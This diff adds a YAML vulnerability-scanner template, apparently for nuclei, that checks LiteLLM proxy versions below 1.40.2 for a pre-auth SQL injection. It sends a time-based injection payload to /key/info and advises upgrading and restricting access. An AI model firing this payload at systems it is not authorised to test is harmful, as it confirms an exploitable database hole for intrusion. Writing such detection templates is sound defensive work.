@@ -1,0 +1,24 @@
+id: litellm-proxy-preauth-sqli
+title: LiteLLM proxy pre-auth SQLi
+cve: CVE-2026-42208
+cvss: 9.8
+severity: critical
+category: ai-infra
+engine: nuclei
+match:
+  service: litellm
+  versions: "<1.40.2"
+http:
+  - method: POST
+    path: /key/info
+    body: '{"key":"1'' OR sleep(5)-- -"}'
+    matchers:
+      - type: dsl
+        dsl: ["duration>=5"]
+remediation: |
+  Upgrade LiteLLM to >=1.40.2. Restrict /key/* to authenticated admin only and
+  place the proxy behind network ACLs so the management API is never internet-exposed.
+references:
+  - https://github.com/BerriAI/litellm/security/advisories
+  - https://nvd.nist.gov/vuln/detail/CVE-2026-42208
+signature: stub
